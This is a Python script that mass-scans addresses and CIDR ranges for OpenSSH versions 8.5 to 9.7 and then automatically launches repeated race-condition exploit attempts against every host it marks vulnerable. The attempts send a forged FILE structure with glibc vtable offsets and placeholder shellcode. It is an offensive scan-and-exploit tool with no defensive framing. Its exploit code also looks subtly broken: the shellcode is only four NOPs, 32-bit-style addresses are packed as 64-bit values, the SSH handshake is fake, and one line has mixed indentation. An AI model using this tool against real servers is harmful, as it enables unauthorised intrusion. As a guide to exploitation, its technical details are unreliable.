#!/usr/bin/env python3

import socket
import struct
import argparse
import ipaddress
import threading
from queue import Queue
import time

GLIBC_BASES = [0xb7200000, 0xb7400000]
SHELLCODE = b"\x90\x90\x90\x90" 
MAX_ATTEMPTS = 20000
SLEEP_INTERVAL = 0.1  # 100ms
MAX_PACKET_SIZE = 1024

def setup_connection(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(0)
    server_address = (ip, port)
    sock.connect_ex(server_address)
    return sock

def send_packet(sock, packet_type, data):
    packet_len = len(data) + 5
    packet = struct.pack('>I', packet_len) + struct.pack('B', packet_type) + data
    sock.sendall(packet)

def send_ssh_version(sock):
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    sock.sendall(ssh_version)

def receive_ssh_version(sock):
    while True:
        try:
            response = sock.recv(256)
            if response:
                print(f"Received SSH version: {response.decode()}")
                break
        except BlockingIOError:
            time.sleep(0.1)

def send_kex_init(sock):
    kexinit_payload = b"\x00" * 36
    send_packet(sock, 20, kexinit_payload)

def receive_kex_init(sock):
    while True:
        try:
            response = sock.recv(1024)
            if response:
                print(f"Received KEX_INIT ({len(response)} bytes)")
                break
        except BlockingIOError:
            time.sleep(0.1)

def perform_ssh_handshake(sock):
    send_ssh_version(sock)
    receive_ssh_version(sock)
    send_kex_init(sock)
    receive_kex_init(sock)

def create_fake_file_structure(data, glibc_base):
    fake_file = struct.pack('<QQQQQQQQQQQQQQQ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x61)
    vtable_offset = struct.pack('<Q', glibc_base + 0x21b740)
    codecvt_offset = struct.pack('<Q', glibc_base + 0x21d7f8)
    data[:len(fake_file)] = fake_file
    data[-16:] = vtable_offset + codecvt_offset

def attempt_race_condition(sock, parsing_time, glibc_base):
    final_packet = bytearray(MAX_PACKET_SIZE)
    create_fake_file_structure(final_packet, glibc_base)
    final_packet[:len(SHELLCODE)] = SHELLCODE
    sock.sendall(final_packet[:-1])
    time.sleep(parsing_time - 0.001)
    sock.sendall(final_packet[-1:])
    try:
        response = sock.recv(1024)
        if response:
            print(f"Received response after exploit attempt ({len(response)} bytes)")
            return True
    except BlockingIOError:
        return False
    return False

def perform_exploit(ip, port):
    success = False
    for glibc_base in GLIBC_BASES:
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")
        for attempt in range(MAX_ATTEMPTS):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of {MAX_ATTEMPTS}")
            try:
                sock = setup_connection(ip, port)
                perform_ssh_handshake(sock)
                parsing_time = 0.5 
                if attempt_race_condition(sock, parsing_time, glibc_base):
                    print(f"Possible exploitation success on attempt {attempt} with glibc base 0x{glibc_base:x}!")
                    success = True
                    break
            except Exception as e:
                print(f"Error on attempt {attempt}: {e}")
            finally:
                sock.close()
                time.sleep(SLEEP_INTERVAL)
        if success:
            break
    return success

def get_ssh_sock(ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((ip, port))
        return sock
    except:
        return None

def get_ssh_banner(sock):
    try:
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except Exception as e:
        return str(e)

def check_vulnerability(ip, port, timeout, result_queue):
    sshsock = get_ssh_sock(ip, port, timeout)
    if not sshsock:
        result_queue.put((ip, port, 'closed', "Port closed"))
        return

    banner = get_ssh_banner(sshsock)
    if "SSH-2.0-OpenSSH" not in banner:
        result_queue.put((ip, port, 'failed', f"Failed to retrieve SSH banner: {banner}"))
        return

    vulnerable_versions = [
        'SSH-2.0-OpenSSH_8.5',
        'SSH-2.0-OpenSSH_8.6',
        'SSH-2.0-OpenSSH_8.7',
        'SSH-2.0-OpenSSH_8.8',
        'SSH-2.0-OpenSSH_8.9',
        'SSH-2.0-OpenSSH_9.0',
        'SSH-2.0-OpenSSH_9.1',
        'SSH-2.0-OpenSSH_9.2',
        'SSH-2.0-OpenSSH_9.3',
        'SSH-2.0-OpenSSH_9.4',
        'SSH-2.0-OpenSSH_9.5',
        'SSH-2.0-OpenSSH_9.6',
        'SSH-2.0-OpenSSH_9.7'
    ]

    excluded_versions = [
        'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10',
        'SSH-2.0-OpenSSH_9.3p1 Ubuntu-3ubuntu3.6',
        'SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.3',
        'SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3',
        'SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3'
    ]

    if any(version in banner for version in vulnerable_versions) and banner not in excluded_versions:
        result_queue.put((ip, port, 'vulnerable', f"(running {banner})"))
    else:
        result_queue.put((ip, port, 'not_vulnerable', f"(running {banner})"))

def process_ip_list(ip_list_file):
    ips = []
    try:
        with open(ip_list_file, 'r') as file:
            ips.extend(file.readlines())
    except IOError:
        print(f"❌ [-] Could not read file: {ip_list_file}")
    return [ip.strip() for ip in ips]

def main():
    parser = argparse.ArgumentParser(description="Check if servers are running a vulnerable version of OpenSSH and perform exploitation if possible.")
    parser.add_argument("targets", nargs='*', help="IP addresses, domain names, file paths containing IP addresses, or CIDR network ranges.")
    parser.add_argument("--port", type=int, default=22, help="Port number to check (default: 22).")
    parser.add_argument("-t", "--timeout", type=float, default=1.0, help="Connection timeout in seconds (default: 1 second).")
    parser.add_argument("-l", "--list", help="File containing a list of IP addresses to check.")

    args = parser.parse_args()
    targets = args.targets
    port = args.port
    timeout = args.timeout

    ips = []

    if args.list:
        ips.extend(process_ip_list(args.list))

    for target in targets:
        try:
            with open(target, 'r') as file:
                ips.extend(file.readlines())
        except IOError:
            if '/' in target:
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    ips.extend([str(ip) for ip in network.hosts()])
                except ValueError:
                    print(f"❌ [-] Invalid CIDR notation: {target}")
            else:
                ips.append(target)

    result_queue = Queue()
    threads = []

    for ip in ips:
        ip = ip.strip()
        thread = threading.Thread(target=check_vulnerability, args=(ip, port, timeout, result_queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    total_scanned = len(ips)
    closed_ports = 0
    not_vulnerable = []
    vulnerable = []

    while not result_queue.empty():
        ip, port, status, message = result_queue.get()
        if status == 'closed':
            closed_ports += 1
        elif status == 'vulnerable':
            vulnerable.append((ip, message))
        elif status == 'not_vulnerable':
            not_vulnerable.append((ip, message))
        else:
		            print(f"⚠️ [!] Server at {ip}:{port} is {message}")

    print(f"\n🛡️ Servers not vulnerable: {len(not_vulnerable)}\n")
    for ip, msg in not_vulnerable:
        print(f"   [+] Server at {ip} {msg}")
    print(f"\n🚨 Servers likely vulnerable: {len(vulnerable)}\n")
    for ip, msg in vulnerable:
        print(f"   [+] Server at {ip} {msg}")
    print(f"\n🔒 Servers with port {port} closed: {closed_ports}")
    print(f"\n📊 Total scanned targets: {total_scanned}\n")

    # Perform exploitation on vulnerable servers
    print("\n\nStarting exploitation...\n")
    for ip, _ in vulnerable:
        success = perform_exploit(ip, port)
        if success:
            print(f"\n[!] Successfully exploited server at {ip}!\n")
        else:
            print(f"\n[!] Exploitation attempt failed for server at {ip}\n")

if __name__ == "__main__":
    main()
